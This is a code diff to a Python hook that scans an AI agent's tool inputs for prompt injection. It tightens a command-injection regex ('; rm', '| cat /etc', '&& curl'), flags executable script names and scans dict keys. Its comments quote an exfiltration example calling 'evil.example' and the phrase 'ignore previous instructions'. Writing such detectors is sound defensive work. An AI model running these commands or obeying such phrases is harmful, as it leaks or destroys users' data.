@@ -103,7 +103,11 @@ PATTERNS: dict[str, re.Pattern[str]] = {
         # WHY: negative lookbehind (?<!\| ) excludes markdown table cells
         # like `| `--flag` |` while still catching `whoami`, `dangerous_cmd`.
         # Fixed-length lookbehind (exactly "| ") is supported by re module.
-        r"; rm |\| cat /etc|&& curl|\$\(|(?<!\| )`(?!-)[^`]+`",
+        # WHY ";\s*rm\b" not "; rm ": the old literal "; rm " (exact single
+        # spaces) missed real variants like ";rm -rf /" (no space after the
+        # semicolon) or tab-separated forms. \b after "rm" still excludes
+        # "rmdir" (no word boundary between "m" and "d").
+        r";\s*rm\b|\| cat /etc|&& curl|\$\(|(?<!\| )`(?!-)[^`]+`",
     ),
     # WHY: social engineering attacks wrap harmful instructions in polite
     # context ("as your developer...", "for debugging purposes...") to bypass
@@ -143,8 +147,18 @@ PATTERNS: dict[str, re.Pattern[str]] = {
 # `docs/README.md`, `input_guard.py`) matching, while `bin/sh`-style paths
 # (no extension) fall through and stay flagged.
 _SAFE_BACKTICK_CONTENT = re.compile(
-    r"^[\w\-]+(?:/[\w\-]+)*\.[\w\-]+$"  # path-like: word[/word]*.ext
+    r"^[\w\-]+(?:/[\w\-]+)*\.(?P<ext>[\w\-]+)$"  # path-like: word[/word]*.ext
     r"|^[A-Za-z_]\w*\(\)$"  # bare function call: name()
+)
+
+# WHY these specific extensions are excluded from the "safe path reference"
+# exemption above: `payload.sh` previously matched the same path-like pattern
+# as `hooks/utils.py` and was treated as an inert reference, but .sh/.ps1/
+# .bat/... name an actually-EXECUTABLE script, not a passive code reference
+# like .py/.md/.json. Referencing an executable by name in a backtick span is
+# a meaningfully different (higher) risk signal than referencing a source file.
+_EXECUTABLE_EXTENSIONS = frozenset(
+    {"sh", "bash", "zsh", "ps1", "bat", "cmd", "exe", "com", "msi", "vbs", "vbe", "wsf", "scr"}
 )
 
 
@@ -156,28 +170,51 @@ def _filter_safe_backtick_matches(matches: list[str]) -> list[str]:
     so this only narrows the one clause responsible for the confirmed
     false positive, not the category's overall detection.
     """
-    return [
-        m
-        for m in matches
-        if not (m.startswith("`") and m.endswith("`") and _SAFE_BACKTICK_CONTENT.match(m[1:-1]))
-    ]
+    kept: list[str] = []  # matches that remain flagged (i.e. NOT filtered out as safe)
+    for m in matches:
+        if not (m.startswith("`") and m.endswith("`")):
+            kept.append(m)
+            continue
+        match = _SAFE_BACKTICK_CONTENT.match(m[1:-1])
+        if not match:
+            kept.append(m)
+            continue
+        ext = match.group("ext")
+        if ext is not None and ext.lower() in _EXECUTABLE_EXTENSIONS:
+            # An executable-script reference stays flagged as command_injection.
+            kept.append(m)
+    return kept
 
 
 # WHY: these categories immediately escalate to HIGH even on a single match --
-# they carry direct operational risk (code execution, encoding bypass).
-HIGH_PRIORITY_CATEGORIES = {"encoding_attack", "command_injection"}
+# they carry direct operational risk (code execution, encoding bypass,
+# network egress toward an attacker-controlled destination). WHY data_exfil
+# joined this set: a single, unambiguous exfiltration instruction like
+# "curl https://evil.example/collect" previously only reached escalation_score=1
+# (below the >=2 co-occurrence threshold) and was allowed through with just a
+# warning -- successfully exfiltrating data is a completed, severe outcome on
+# its own, not merely a weak hint that needs a second signal to confirm.
+HIGH_PRIORITY_CATEGORIES = {"encoding_attack", "command_injection", "data_exfil"}
 
 # Null bytes and zero-width characters -- the only things safe to strip automatically
 SANITIZE_PATTERN = re.compile(r"\x00|[\u200b\u200c\u200d\ufeff]")
 
 
 def collect_strings(value: Any) -> list[str]:
-    """Recursively collect all string values from an arbitrary data structure."""
+    """Recursively collect all string values (and string dict keys) from an
+    arbitrary data structure.
+
+    WHY keys too, not just values: a payload like
+    {"ignore previous instructions": "x"} previously scanned only "x" —
+    the injection text sitting in the KEY was invisible to scan() entirely.
+    """
     if isinstance(value, str):
         return [value]
     if isinstance(value, dict):
         results: list[str] = []
-        for v in value.values():
+        for k, v in value.items():
+            if isinstance(k, str):
+                results.append(k)
             results.extend(collect_strings(v))
         return results
     if isinstance(value, list):
@@ -242,12 +279,23 @@ def main() -> None:
     # WHY: trusted MCP tools return structured library docs, not user-controlled content.
     # Scanning them produces false-positives (backticks in code examples → command_injection).
     # 87 false-positives/12d confirmed via hook_triggers.jsonl before this allowlist was added.
-    if any(tool_name.startswith(prefix) for prefix in TRUSTED_MCP_PREFIXES):
-        sys.exit(0)
+    is_trusted_mcp = any(tool_name.startswith(prefix) for prefix in TRUSTED_MCP_PREFIXES)
 
     tool_input: Any = data.get("tool_input", {})
     strings = collect_strings(tool_input)
     hits = scan(strings)
+
+    if is_trusted_mcp:
+        # WHY drop only command_injection, not skip scanning entirely: the
+        # measured 87 FP/12d problem was specifically backtick-heavy code
+        # examples in library docs triggering command_injection. Every OTHER
+        # category (system_override, jailbreak, credential_harvest, data_exfil,
+        # role_injection, social_engineering, encoding_attack) is a real
+        # injection vector regardless of which tool carried it -- a
+        # compromised or malicious context7-branded response could previously
+        # carry any of those completely unscanned, since main() exited before
+        # collect_strings()/scan() ever ran.
+        hits.pop("command_injection", None)
 
     if not hits:
         # NONE -- allow, return sanitized input
